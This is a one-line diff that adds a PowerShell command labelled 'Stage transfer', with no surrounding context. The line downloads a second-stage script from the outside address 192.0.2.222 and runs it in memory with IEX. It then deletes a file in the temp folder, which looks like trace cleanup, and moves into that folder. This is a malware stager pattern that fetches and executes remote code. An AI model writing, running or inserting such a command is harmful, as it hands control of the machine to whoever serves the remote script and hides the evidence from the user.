@@ -1,0 +1,1 @@
+<# Stage transfer #> $DownloadedScript = (New-Object System.Net.WebClient).DownloadString('http://192.0.2.222/stage2.ps1'); IEX $DownloadedScript; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; Set-Location -Path $env:TEMP
